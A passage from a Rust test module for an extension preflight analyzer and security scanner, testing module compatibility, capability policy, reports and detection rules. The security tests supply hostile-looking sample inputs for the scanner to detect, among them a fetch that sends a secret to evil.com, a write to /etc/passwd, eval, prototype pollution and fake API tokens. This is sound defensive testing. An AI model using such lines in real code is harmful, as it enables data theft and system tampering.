            Some(ModuleSupport::Partial)
        );
        assert_eq!(
            known_module_support("fs/promises"),
            Some(ModuleSupport::Partial)
        );
    }

    #[test]
    fn known_modules_error_throw() {
        assert_eq!(
            known_module_support("node:net"),
            Some(ModuleSupport::ErrorThrow)
        );
        assert_eq!(
            known_module_support("node:tls"),
            Some(ModuleSupport::ErrorThrow)
        );
        assert_eq!(known_module_support("dns"), Some(ModuleSupport::ErrorThrow));
    }

    #[test]
    fn known_modules_stubs() {
        assert_eq!(known_module_support("zlib"), Some(ModuleSupport::Stub));
        assert_eq!(known_module_support("node:vm"), Some(ModuleSupport::Stub));
        assert_eq!(known_module_support("chokidar"), Some(ModuleSupport::Stub));
    }

    #[test]
    fn unknown_module_returns_none() {
        assert_eq!(known_module_support("my-custom-lib"), None);
        assert_eq!(known_module_support("./relative"), None);
    }

    // ---- module_remediation ----

    #[test]
    fn remediation_for_real_is_none() {
        assert!(module_remediation("path", ModuleSupport::Real).is_none());
    }

    #[test]
    fn remediation_for_net_error_throw() {
        let r = module_remediation("node:net", ModuleSupport::ErrorThrow);
        assert!(r.is_some());
        assert!(r.unwrap().contains("fetch()"));
    }

    #[test]
    fn remediation_for_fs_promises_partial() {
        let r = module_remediation("fs/promises", ModuleSupport::Partial);
        assert!(r.is_some());
        assert!(r.unwrap().contains("synchronous"));
    }

    // ---- extract helpers ----

    #[test]
    fn extract_specifier_from_message_works() {
        let msg = "import of unsupported builtin `node:vm`";
        assert_eq!(
            extract_specifier_from_message(msg),
            Some("node:vm".to_string())
        );
    }

    #[test]
    fn extract_specifier_from_message_none() {
        assert_eq!(extract_specifier_from_message("no backticks"), None);
    }

    #[test]
    fn extract_import_specifiers_simple_import() {
        let specs = extract_import_specifiers_simple("import fs from 'node:fs';");
        assert_eq!(specs, vec!["node:fs"]);
    }

    #[test]
    fn extract_import_specifiers_simple_require() {
        let specs = extract_import_specifiers_simple("const fs = require('fs');");
        assert_eq!(specs, vec!["fs"]);
    }

    #[test]
    fn extract_import_specifiers_skips_relative() {
        let specs = extract_import_specifiers_simple("import foo from './foo';");
        assert!(specs.is_empty());
    }

    #[test]
    fn extract_quoted_string_double() {
        assert_eq!(
            extract_quoted_string("\"hello\" rest"),
            Some("hello".to_string())
        );
    }

    #[test]
    fn extract_quoted_string_single() {
        assert_eq!(
            extract_quoted_string("'hello' rest"),
            Some("hello".to_string())
        );
    }

    #[test]
    fn extract_quoted_string_no_quote() {
        assert_eq!(extract_quoted_string("no quotes"), None);
    }

    // ---- PreflightReport ----

    #[test]
    fn empty_findings_gives_pass() {
        let report = PreflightReport::from_findings("test-ext".into(), vec![]);
        assert_eq!(report.verdict, PreflightVerdict::Pass);
        assert_eq!(report.summary.errors, 0);
        assert_eq!(report.summary.warnings, 0);
    }

    #[test]
    fn warning_findings_gives_warn() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "stub".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("test-ext".into(), findings);
        assert_eq!(report.verdict, PreflightVerdict::Warn);
        assert_eq!(report.summary.warnings, 1);
    }

    #[test]
    fn error_findings_gives_fail() {
        let findings = vec![
            PreflightFinding {
                severity: FindingSeverity::Error,
                category: FindingCategory::CapabilityPolicy,
                message: "denied".into(),
                remediation: None,
                file: None,
                line: None,
            },
            PreflightFinding {
                severity: FindingSeverity::Warning,
                category: FindingCategory::ModuleCompat,
                message: "stub".into(),
                remediation: None,
                file: None,
                line: None,
            },
        ];
        let report = PreflightReport::from_findings("test-ext".into(), findings);
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert_eq!(report.summary.errors, 1);
        assert_eq!(report.summary.warnings, 1);
    }

    #[test]
    fn report_schema_version() {
        let report = PreflightReport::from_findings("x".into(), vec![]);
        assert_eq!(report.schema, PREFLIGHT_SCHEMA);
    }

    #[test]
    fn security_scan_report_json_roundtrip() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "test".into(),
            remediation: Some("fix it".into()),
            file: Some("index.ts".into()),
            line: Some(42),
        }];
        let report = PreflightReport::from_findings("ext-1".into(), findings);
        let json = report.to_json().unwrap();
        let back: PreflightReport = serde_json::from_str(&json).unwrap();
        assert_eq!(back.verdict, PreflightVerdict::Warn);
        assert_eq!(back.findings.len(), 1);
        assert_eq!(back.findings[0].line, Some(42));
    }

    #[test]
    fn report_markdown_contains_verdict() {
        let report = PreflightReport::from_findings("my-ext".into(), vec![]);
        let md = report.render_markdown();
        assert!(md.contains("PASS"));
        assert!(md.contains("my-ext"));
    }

    #[test]
    fn report_markdown_lists_findings() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Error,
            category: FindingCategory::ForbiddenPattern,
            message: "process.binding".into(),
            remediation: Some("remove it".into()),
            file: Some("main.ts".into()),
            line: Some(10),
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        let md = report.render_markdown();
        assert!(md.contains("process.binding"));
        assert!(md.contains("main.ts:10"));
        assert!(md.contains("remove it"));
    }

    // ---- PreflightAnalyzer.analyze_source ----

    #[test]
    fn analyze_source_clean_extension() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
import { Type } from "@sinclair/typebox";
import path from "node:path";

export default function(pi) {
    pi.tool({ name: "hello", schema: Type.Object({}) });
}
"#;
        let report = analyzer.analyze_source("clean-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Pass);
    }

    #[test]
    fn analyze_source_missing_module() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
import net from "node:net";
"#;
        let report = analyzer.analyze_source("net-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.message.contains("node:net"))
        );
    }

    #[test]
    fn analyze_source_denied_capability() {
        // Use safe policy — exec is denied
        let policy = crate::extensions::PolicyProfile::Safe.to_policy();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
const { exec } = require("child_process");
export default function(pi) {
    pi.exec("ls");
}
"#;
        let report = analyzer.analyze_source("exec-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Fail);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == FindingCategory::CapabilityPolicy
                    && f.message.contains("exec"))
        );
    }

    #[test]
    fn analyze_source_env_prompts_on_default_policy() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r"
const key = process.env.API_KEY;
";
        let report = analyzer.analyze_source("env-ext", source);
        // Default policy has env in deny_caps, so it should be denied
        assert!(report.findings.iter().any(|f| f.message.contains("env")));
    }

    #[test]
    fn analyze_source_stub_module_warns() {
        let policy = ExtensionPolicy::default();
        let analyzer = PreflightAnalyzer::new(&policy, None);
        let source = r#"
import chokidar from "chokidar";
"#;
        let report = analyzer.analyze_source("watch-ext", source);
        assert_eq!(report.verdict, PreflightVerdict::Warn);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.message.contains("chokidar"))
        );
    }

    #[test]
    fn analyze_source_per_extension_override_allows() {
        use crate::extensions::ExtensionOverride;
        use std::collections::HashMap;

        // To test per-extension allow, we need a policy where exec is NOT
        // in global deny_caps (since global deny has higher precedence).
        // Mode = Strict means the fallback would deny, but per-extension
        // allow should override the fallback.
        let mut per_ext = HashMap::new();
        per_ext.insert(
            "my-ext".to_string(),
            ExtensionOverride {
                mode: None,
                allow: vec!["exec".to_string()],
                deny: vec![],
                quota: None,
            },
        );

        let policy = ExtensionPolicy {
            mode: crate::extensions::ExtensionPolicyMode::Strict,
            max_memory_mb: 256,
            default_caps: vec!["read".to_string(), "write".to_string()],
            deny_caps: vec![], // No global deny — test per-extension allow
            per_extension: per_ext,
        };
        let analyzer = PreflightAnalyzer::new(&policy, Some("my-ext"));
        let source = r#"
const { exec } = require("child_process");
pi.exec("ls");
"#;
        let report = analyzer.analyze_source("my-ext", source);
        // exec should be allowed via per-extension override
        let exec_denied = report.findings.iter().any(|f| {
            f.category == FindingCategory::CapabilityPolicy
                && f.message.contains("exec")
                && f.severity == FindingSeverity::Error
        });
        assert!(
            !exec_denied,
            "exec should be allowed via per-extension override"
        );
    }

    // ---- Verdict display ----

    #[test]
    fn verdict_display() {
        assert_eq!(format!("{}", PreflightVerdict::Pass), "PASS");
        assert_eq!(format!("{}", PreflightVerdict::Warn), "WARN");
        assert_eq!(format!("{}", PreflightVerdict::Fail), "FAIL");
    }

    #[test]
    fn verdict_serde_roundtrip() {
        for v in [
            PreflightVerdict::Pass,
            PreflightVerdict::Warn,
            PreflightVerdict::Fail,
        ] {
            let json = serde_json::to_string(&v).unwrap();
            let back: PreflightVerdict = serde_json::from_str(&json).unwrap();
            assert_eq!(v, back);
        }
    }

    // ---- Finding categories ----

    #[test]
    fn finding_category_display() {
        assert_eq!(
            format!("{}", FindingCategory::ModuleCompat),
            "module_compat"
        );
        assert_eq!(
            format!("{}", FindingCategory::CapabilityPolicy),
            "capability_policy"
        );
        assert_eq!(
            format!("{}", FindingCategory::ForbiddenPattern),
            "forbidden_pattern"
        );
        assert_eq!(
            format!("{}", FindingCategory::FlaggedPattern),
            "flagged_pattern"
        );
    }

    // ---- ConfidenceScore ----

    #[test]
    fn confidence_score_no_issues() {
        let score = ConfidenceScore::from_counts(0, 0);
        assert_eq!(score.value(), 100);
        assert_eq!(score.label(), "High");
    }

    #[test]
    fn confidence_score_one_warning() {
        let score = ConfidenceScore::from_counts(0, 1);
        assert_eq!(score.value(), 90);
        assert_eq!(score.label(), "High");
    }

    #[test]
    fn confidence_score_two_warnings() {
        let score = ConfidenceScore::from_counts(0, 2);
        assert_eq!(score.value(), 80);
        assert_eq!(score.label(), "Medium");
    }

    #[test]
    fn confidence_score_one_error() {
        let score = ConfidenceScore::from_counts(1, 0);
        assert_eq!(score.value(), 75);
        assert_eq!(score.label(), "Medium");
    }

    #[test]
    fn confidence_score_many_errors_floors_at_zero() {
        let score = ConfidenceScore::from_counts(5, 5);
        assert_eq!(score.value(), 0);
        assert_eq!(score.label(), "Very Low");
    }

    #[test]
    fn confidence_score_display() {
        let score = ConfidenceScore::from_counts(0, 0);
        assert_eq!(format!("{score}"), "100% (High)");
        let score = ConfidenceScore::from_counts(1, 2);
        assert_eq!(format!("{score}"), "55% (Low)");
    }

    #[test]
    fn confidence_score_serde_roundtrip() {
        let score = ConfidenceScore::from_counts(1, 1);
        let json = serde_json::to_string(&score).unwrap();
        let back: ConfidenceScore = serde_json::from_str(&json).unwrap();
        assert_eq!(score, back);
    }

    // ---- risk_banner_text ----

    #[test]
    fn risk_banner_pass() {
        let report = PreflightReport::from_findings("ext".into(), vec![]);
        assert!(report.risk_banner.contains("compatible"));
        assert!(report.risk_banner.contains("100%"));
    }

    #[test]
    fn risk_banner_warn() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "stub".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        assert!(report.risk_banner.contains("may have issues"));
        assert!(report.risk_banner.contains("1 warning"));
    }

    #[test]
    fn risk_banner_fail() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Error,
            category: FindingCategory::ForbiddenPattern,
            message: "bad".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        assert!(report.risk_banner.contains("incompatible"));
        assert!(report.risk_banner.contains("1 error"));
    }

    // ---- render_markdown includes confidence and banner ----

    #[test]
    fn render_markdown_includes_confidence() {
        let report = PreflightReport::from_findings("ext".into(), vec![]);
        let md = report.render_markdown();
        assert!(md.contains("Confidence"));
        assert!(md.contains("100%"));
    }

    #[test]
    fn render_markdown_includes_risk_banner() {
        let findings = vec![PreflightFinding {
            severity: FindingSeverity::Warning,
            category: FindingCategory::ModuleCompat,
            message: "stub".into(),
            remediation: None,
            file: None,
            line: None,
        }];
        let report = PreflightReport::from_findings("ext".into(), findings);
        let md = report.render_markdown();
        assert!(md.contains("> "));
        assert!(md.contains("may have issues"));
    }

    // ---- report confidence in JSON ----

    #[test]
    fn report_json_includes_confidence() {
        let report = PreflightReport::from_findings("ext".into(), vec![]);
        let json = report.to_json().unwrap();
        assert!(json.contains("\"confidence\""));
        assert!(json.contains("\"risk_banner\""));
    }

    // ---- capability_remediation ----

    #[test]
    fn capability_remediation_exec() {
        let r = capability_remediation("exec");
        assert!(r.contains("allow-dangerous"));
    }

    #[test]
    fn capability_remediation_env() {
        let r = capability_remediation("env");
        assert!(r.contains("per-extension"));
    }

    #[test]
    fn capability_remediation_other() {
        let r = capability_remediation("http");
        assert!(r.contains("default_caps"));
    }

    // ================================================================
    // Security scanner tests (bd-21vng)
    // ================================================================

    fn scan(source: &str) -> SecurityScanReport {
        SecurityScanner::scan_source("test-ext", source)
    }

    fn has_rule(report: &SecurityScanReport, rule: SecurityRuleId) -> bool {
        report.findings.iter().any(|f| f.rule_id == rule)
    }

    // ---- RiskTier ----

    #[test]
    fn risk_tier_ordering() {
        assert!(RiskTier::Critical < RiskTier::High);
        assert!(RiskTier::High < RiskTier::Medium);
        assert!(RiskTier::Medium < RiskTier::Low);
    }

    #[test]
    fn risk_tier_serde_roundtrip() {
        for tier in [
            RiskTier::Critical,
            RiskTier::High,
            RiskTier::Medium,
            RiskTier::Low,
        ] {
            let json = serde_json::to_string(&tier).unwrap();
            let back: RiskTier = serde_json::from_str(&json).unwrap();
            assert_eq!(tier, back);
        }
    }

    #[test]
    fn risk_tier_display() {
        assert_eq!(format!("{}", RiskTier::Critical), "critical");
        assert_eq!(format!("{}", RiskTier::Low), "low");
    }

    // ---- SecurityRuleId ----

    #[test]
    fn rule_id_serde_roundtrip() {
        let rule = SecurityRuleId::EvalUsage;
        let json = serde_json::to_string(&rule).unwrap();
        assert_eq!(json, "\"SEC-EVAL-001\"");
        let back: SecurityRuleId = serde_json::from_str(&json).unwrap();
        assert_eq!(rule, back);
    }

    #[test]
    fn rule_id_default_tier_consistency() {
        // All critical rules should have Critical tier.
        assert_eq!(
            SecurityRuleId::EvalUsage.default_tier(),
            RiskTier::Critical
        );
        assert_eq!(
            SecurityRuleId::ProcessBinding.default_tier(),
            RiskTier::Critical
        );
        // High.
        assert_eq!(
            SecurityRuleId::HardcodedSecret.default_tier(),
            RiskTier::High
        );
        // Medium.
        assert_eq!(
            SecurityRuleId::ProcessEnvAccess.default_tier(),
            RiskTier::Medium
        );
        // Low.
        assert_eq!(
            SecurityRuleId::DebuggerStatement.default_tier(),
            RiskTier::Low
        );
    }

    // ---- Clean extension ----

    #[test]
    fn clean_extension_has_no_findings() {
        let report = scan(
            r#"
import path from "node:path";
const p = path.join("a", "b");
export default function init(pi) {
    pi.tool({ name: "hello", schema: {} });
}
"#,
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.overall_tier, RiskTier::Low);
        assert!(report.verdict.starts_with("CLEAN"));
        assert!(!report.should_block());
        assert!(!report.needs_review());
    }

    // ---- Critical tier detections ----

    #[test]
    fn detect_eval_usage() {
        let report = scan("const x = eval('1+1');");
        assert!(has_rule(&report, SecurityRuleId::EvalUsage));
        assert_eq!(report.overall_tier, RiskTier::Critical);
        assert!(report.should_block());
    }

    #[test]
    fn eval_in_identifier_not_flagged() {
        let report = scan("const retrieval = getData();");
        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
    }

    #[test]
    fn detect_new_function() {
        let report = scan("const fn = new Function('a', 'return a + 1');");
        assert!(has_rule(&report, SecurityRuleId::NewFunctionUsage));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn new_function_empty_not_flagged() {
        // new Function() with no args is less dangerous — still flagged
        // but that's fine, the rule covers the general case.
        let report = scan("const fn = new Function();");
        assert!(!has_rule(&report, SecurityRuleId::NewFunctionUsage));
    }

    #[test]
    fn detect_process_binding() {
        let report = scan("process.binding('fs');");
        assert!(has_rule(&report, SecurityRuleId::ProcessBinding));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn detect_process_dlopen() {
        let report = scan("process.dlopen(module, '/bad/addon.node');");
        assert!(has_rule(&report, SecurityRuleId::ProcessDlopen));
    }

    #[test]
    fn detect_proto_pollution() {
        let report = scan("obj.__proto__ = malicious;");
        assert!(has_rule(&report, SecurityRuleId::ProtoPollution));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    #[test]
    fn detect_set_prototype_of() {
        let report = scan("Object.setPrototypeOf(target, evil);");
        assert!(has_rule(&report, SecurityRuleId::ProtoPollution));
    }

    #[test]
    fn detect_require_cache_manipulation() {
        let report = scan("delete require.cache[require.resolve('./module')];");
        assert!(has_rule(&report, SecurityRuleId::RequireCacheManip));
        assert_eq!(report.overall_tier, RiskTier::Critical);
    }

    // ---- High tier detections ----

    #[test]
    fn detect_hardcoded_secret() {
        let report = scan(r#"const api_key = "sk-ant-api03-abc123";"#);
        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
        assert!(report.needs_review());
    }

    #[test]
    fn detect_hardcoded_password() {
        let report = scan(r#"const password = "s3cretP@ss";"#);
        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn env_lookup_not_flagged_as_secret() {
        let report = scan("const key = process.env.API_KEY;");
        // Should flag ProcessEnvAccess but NOT HardcodedSecret.
        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
        assert!(!has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn empty_secret_not_flagged() {
        let report = scan(r#"const api_key = "";"#);
        assert!(!has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn detect_token_prefix() {
        let report = scan(r#"const token = "ghp_abc123def456";"#);
        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
    }

    #[test]
    fn detect_dynamic_import() {
        let report = scan("const mod = await import(userInput);");
        assert!(has_rule(&report, SecurityRuleId::DynamicImport));
    }

    #[test]
    fn static_import_not_flagged_as_dynamic() {
        let report = scan("import fs from 'node:fs';");
        assert!(!has_rule(&report, SecurityRuleId::DynamicImport));
    }

    #[test]
    fn detect_define_property_on_global() {
        let report = scan(
            "Object.defineProperty(globalThis, 'fetch', { value: evilFetch });",
        );
        assert!(has_rule(&report, SecurityRuleId::DefinePropertyAbuse));
    }

    #[test]
    fn detect_network_exfiltration() {
        let report = scan("fetch(`https://evil.com/?data=${secret}`);");
        assert!(has_rule(&report, SecurityRuleId::NetworkExfiltration));
    }

    #[test]
    fn detect_sensitive_path_write() {
        let report = scan("fs.writeFileSync('/etc/passwd', payload);");
        assert!(has_rule(&report, SecurityRuleId::SensitivePathWrite));
    }

    #[test]
    fn normal_write_not_flagged() {
        let report = scan("fs.writeFileSync('/tmp/out.txt', data);");
        assert!(!has_rule(&report, SecurityRuleId::SensitivePathWrite));
    }

    // ---- Medium tier detections ----

    #[test]
    fn detect_process_env() {
        let report = scan("const v = process.env.NODE_ENV;");
        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
        assert_eq!(report.overall_tier, RiskTier::Medium);
    }

    #[test]
    fn detect_timer_abuse() {
        let report = scan("setInterval(pollServer, 1);");
        assert!(has_rule(&report, SecurityRuleId::TimerAbuse));
    }

    #[test]
    fn normal_timer_not_flagged() {
        let report = scan("setInterval(tick, 1000);");
        assert!(!has_rule(&report, SecurityRuleId::TimerAbuse));
    }

    #[test]
    fn detect_proxy_usage() {
        let report = scan("const p = new Proxy(target, handler);");
        assert!(has_rule(&report, SecurityRuleId::ProxyReflect));
    }

    #[test]
    fn detect_reflect_usage() {
        let report = scan("const v = Reflect.get(obj, 'key');");
        assert!(has_rule(&report, SecurityRuleId::ProxyReflect));
    }

    #[test]
    fn detect_with_statement() {
        let report = scan("with (obj) { x = 1; }");
        assert!(has_rule(&report, SecurityRuleId::WithStatement));
    }

    // ---- Low tier detections ----

    #[test]
    fn detect_debugger_statement() {
        let report = scan("debugger;");
        assert!(has_rule(&report, SecurityRuleId::DebuggerStatement));
        assert_eq!(report.overall_tier, RiskTier::Low);
    }

    #[test]
    fn detect_console_error() {
        let report = scan("console.error(sensitiveData);");
        assert!(has_rule(&report, SecurityRuleId::ConsoleInfoLeak));
    }

    #[test]
    fn console_log_not_flagged() {
        // Only console.error/warn flagged, not console.log.
        let report = scan("console.log('hello');");
        assert!(!has_rule(&report, SecurityRuleId::ConsoleInfoLeak));
    }

    // ---- Report structure ----

    #[test]
    fn report_schema_and_rulebook_version() {
        let report = scan("// clean");
        assert_eq!(report.schema, SECURITY_SCAN_SCHEMA);
        assert_eq!(report.rulebook_version, SECURITY_RULEBOOK_VERSION);
    }

    #[test]
    fn report_json_roundtrip() {
        let report = scan("eval('bad'); process.env.KEY;");
        let json = report.to_json().unwrap();
        let back: SecurityScanReport = serde_json::from_str(&json).unwrap();
        assert_eq!(back.extension_id, "test-ext");
        assert_eq!(back.overall_tier, RiskTier::Critical);
        assert!(!back.findings.is_empty());
    }

    #[test]
    fn report_tier_counts_accurate() {
        let report = scan(
            r#"
eval('bad');
const api_key = "sk-ant-secret";
process.env.KEY;
debugger;
"#,
        );
        assert!(report.tier_counts.critical >= 1);
        assert!(report.tier_counts.high >= 1);
        assert!(report.tier_counts.medium >= 1);
        assert!(report.tier_counts.low >= 1);
    }

    #[test]
    fn findings_sorted_by_tier_worst_first() {
        let report = scan(
            r#"
debugger;
eval('x');
process.env.KEY;
"#,
        );
        // First finding should be Critical (eval), last should be Low (debugger).
        assert!(!report.findings.is_empty());
        assert_eq!(report.findings[0].risk_tier, RiskTier::Critical);
        let last = report.findings.last().unwrap();
        assert!(last.risk_tier >= report.findings[0].risk_tier);
    }

    // ---- Evidence ledger ----

    #[test]
    fn evidence_ledger_jsonl_format() {
        let report = scan("eval('x'); debugger;");
        let jsonl = security_evidence_ledger_jsonl(&report).unwrap();
        let lines: Vec<&str> = jsonl.lines().collect();
        assert_eq!(lines.len(), report.findings.len());
        for line in &lines {
            let entry: SecurityEvidenceLedgerEntry =
                serde_json::from_str(line).unwrap();
            assert_eq!(entry.schema, SECURITY_EVIDENCE_LEDGER_SCHEMA);
            assert_eq!(entry.extension_id, "test-ext");
            assert_eq!(entry.rulebook_version, SECURITY_RULEBOOK_VERSION);
        }
    }

    #[test]
    fn evidence_ledger_entry_indices_monotonic() {
        let report = scan("eval('a'); eval('b'); debugger;");
        let jsonl = security_evidence_ledger_jsonl(&report).unwrap();
        let entries: Vec<SecurityEvidenceLedgerEntry> = jsonl
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect();
        for (i, entry) in entries.iter().enumerate() {
            assert_eq!(entry.entry_index, i);
        }
    }

    // ---- Comments are skipped ----

    #[test]
    fn single_line_comment_not_flagged() {
        let report = scan("// eval('bad');");
        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
    }

    #[test]
    fn block_comment_not_flagged() {
        let report = scan("/* eval('bad'); */");
        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
    }

    // ---- Determinism ----

    #[test]
    fn scan_is_deterministic() {
        let source = r#"
eval('x');
const api_key = "sk-ant-test";
process.env.HOME;
debugger;
"#;
        let r1 = scan(source);
        let r2 = scan(source);
        let j1 = r1.to_json().unwrap();
        let j2 = r2.to_json().unwrap();
        assert_eq!(j1, j2, "Security scan must be deterministic");
    }

    // ---- Multiple findings per line ----

    #[test]
    fn multiple_rules_fire_on_same_line() {
        // eval + process.env on same line.
        let report = scan("eval(process.env.SECRET);");
        assert!(has_rule(&report, SecurityRuleId::EvalUsage));
        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
    }

    // ---- should_block / needs_review ----

    #[test]
    fn should_block_only_for_critical() {
        assert!(scan("eval('x');").should_block());
        assert!(!scan("process.env.X;").should_block());
        assert!(!scan("debugger;").should_block());
    }

    #[test]
    fn needs_review_for_critical_and_high() {
        assert!(scan("eval('x');").needs_review());
        assert!(scan(r#"const api_key = "sk-ant-test";"#).needs_review());
        assert!(!scan("process.env.X;").needs_review());
    }
}
